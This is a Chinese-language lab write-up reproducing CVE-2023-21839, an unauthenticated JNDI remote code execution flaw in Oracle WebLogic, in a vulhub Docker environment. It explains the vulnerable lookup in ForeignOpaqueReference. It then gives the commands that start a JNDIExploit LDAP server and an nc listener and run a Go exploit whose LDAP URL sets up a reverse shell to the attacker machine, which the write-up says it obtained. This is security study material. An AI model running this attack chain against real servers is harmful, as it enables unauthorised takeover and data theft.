
---
author: 一亨
---
# 	CVE-2023-21839
###### tags:`PoC_Implement` `CVE` `範例`

:::info
[TOC]
:::

## CVE Info
- CVE_ID : 	CVE-2023-21839
- 影響範圍 :

Oracle WebLogic Server 12.2.1.3.0

Oracle WebLogic Server 12.2.1.4.0

Oracle WebLogic Server 14.1.1.0.0
- 說明 : 
```Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). Supported versions that are affected are 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3, IIOP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data. CVSS 3.1 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).```
- cvss_score : ```7.5```
- cvss_vector : ``` CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N```
- NVD_Published_Date : ```01/17/2023```

## CVE 原理
https://www.ddosi.org/cve-2023-21839/
WebLogic是一款Java EE應用程式伺服器，由Oracle公司開發。它是一個高度可擴展且可靠的平台，用於開發和部署分佈式企業級應用程式。WebLogic提供了豐富的功能，包括Web服務支援、JDBC資料庫存取、JMS消息服務、分佈式緩存、集群和負載平衡等。它支援Java EE規範，如EJB、JSP、Servlet、JMS、JDBC和JTA等。WebLogic是企業級應用程式伺服器的領導者之一，廣泛用於金融、保險、製造、零售等各種行業的應用程式開發和部署中。

WebLogic存在遠端代碼執行漏洞，該漏洞允許未經身份驗證的遠端攻擊者通過T3/IIOP協定網路訪問並破壞易受攻擊的WebLogic伺服器，成功利用此漏洞可能導致Oracle WebLogic伺服器被接管或敏感信息洩露。

ForeignOpaqueReference是OpaqueReference介面的實現類。 在ForeignOpaqueReference類中聲明了兩個私有變數：jndiEnvironment和remoteJNDIName，同時聲明了兩個構造方法，在有參構造方法中接收env和remoteJNDIName，並分別賦值給了上面的兩個私有類變數。

ForeignOpaqueReference類的getReferent（）方法是OpaqueReference介面的實現方法，在getReferent（）方法中，retVal = context.lookup（this.remoteJNDIName）; 對本類remoteJNDIName變數中的JNDI位址進行遠端載入，導致了反序列化漏洞
```java
package weblogic.jndi.internal;
// 進入反序列化
public class ForeignOpaqueReference implements OpaqueReference, Serializable {                  
    private Hashtable jndiEnvironment;
    private String remoteJNDIName;
    ......
    public ForeignOpaqueReference(String remoteJNDIName, Hashtable env) {
        this.remoteJNDIName = remoteJNDIName;
        this.jndiEnvironment = env;
    }
    public Object getReferent(Name name, Context ctx) throws NamingException {
        InitialContext context;
        if (this.jndiEnvironment == null) {
            context = new InitialContext();
        } else {
            Hashtable properties = this.decrypt();
            context = new InitialContext(properties);
        }
        Object retVal;
        try {
            retVal = context.lookup(this.remoteJNDIName);   // 漏洞點
        } finally {
            context.close();
        }
        return retVal;
    }
    ......
}
// getReferent() 調用分析
```
```java
package weblogic.jndi;
public interface OpaqueReference {
    Object getReferent(Name var1, Context var2) throws NamingException;
    String toString();
}
```
// OpaqueReference 介面有兩個抽象方法：getReferent() 和 toString()；

// ForeignOpaqueReference 類的 getReferent() 方法調用在 WLNamingManager 類中。
```java
package weblogic.jndi.internal;
public final class WLNamingManager {
    public static Object getObjectInstance(Object boundObject, Name name, Context ctx, Hashtable env) throws NamingException {
        if (boundObject instanceof ClassTypeOpaqueReference) {
            ......
        } else if (boundObject instanceof OpaqueReference) {
            boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx);
        } else if (boundObject instanceof LinkRef) {
            ...
        }
    }
}
```
// CVE-2023-21839 是在反序列化過程中沒有進行惡意操作，在完成反序列化過程後執行了漏洞類 ForeignOpaqueReference 中 getReferent() 方法中的 lookup() 才觸發的漏洞。
// 其中，Context 的 lookup 方法是用來查找指定名稱的物件的，它接受一個字串參數，返回一個 Object 物件，如果沒有找到指定名稱的物件，則返回 null，我們則利用此點觸發反序列化漏洞。

## 環境搭建
在vulhub社區更新了此漏洞，直接拉取該環境即可
```
git clone https://github.com/vulhub/vulhub.git
```
![image](https://github.com/2023Project/2023Project/assets/88665055/386dcf1a-f28c-4f9c-b31d-42516f54440e)

```
cd weblogic  //進入weblogic資料夾
cd CVE-2023-21839  //進入CVE-2023-21839漏洞資料夾
docker-compose up -d //開啟漏洞環境，拉取映像檔
docker ps  //查看當前docker執行情況，可以看到該漏洞環境已經開啟
```
![image](https://github.com/2023Project/2023Project/assets/88665055/fcb04a7e-fcf3-4c1c-b83f-b1cb19f2b08e)


![image](https://github.com/2023Project/2023Project/assets/88665055/3d2db618-8ab5-4b01-ba15-0f1acacde3af)

訪問
``
http://your-ip:7001/console
``
，可以看到登入介面
![image](https://github.com/2023Project/2023Project/assets/88665055/6fc8bf91-b347-41df-8178-713cc06cf78a)

## POC

### 以下是另一台linux
//由於是利用docker建置，理論上可在同一台linux執行，此處考量Kali Linux已有需要環境

複現所需的兩個工具

JNDIExploit-1.2-SNAPSHOT.jar:https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2
//注意JAVA版本為11，若版本為17的話，會遇到java.lang.NoClassDefFoundError: Could not initialize class com.feihong.ldap.utils.Cache錯誤

CVE-2023-21839：https://github.com/4ra1n/CVE-2023-21839
//注意此repository已被移除，我是在以前有下載過

1、在 Kali Linux 上開啟 LDAP 服務監聽。
![image](https://github.com/2023Project/2023Project/assets/88665055/cd2a33dc-431a-477d-aab7-a12decc5b86a)
```
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.5.134
```
2、在Kali Linux上使用nc開啟監聽端口。
![image](https://github.com/2023Project/2023Project/assets/88665055/73dc1ff8-2fba-48d1-9bf1-8cdd928cdf6c)

3、使用CVE-2023-21839工具來進行攻擊測試（將工具上傳至Kali進行編譯，然後再執行）

```
cd cmd
go build -o CVE-2023-21839
./CVE-2023-21839 -ip 192.168.5.138 -port 7001 -ldap ldap://192.168.5.134:1389/Basic/ReverseShell/192.168.5.134/1337
```
![image](https://github.com/2023Project/2023Project/assets/88665055/373d7744-671c-4a8f-bd29-b5c09d8ec2ff)



成功取得WebLogic Server的反彈shell。

## Reference
> 貼來源連接囉~!
> https://stackoverflow.com/questions/52504825/how-to-install-jdk-11-under-ubuntu
> https://github.com/Mr-xn/JNDIExploit-1/issues/2
> https://github.com/vulhub/vulhub
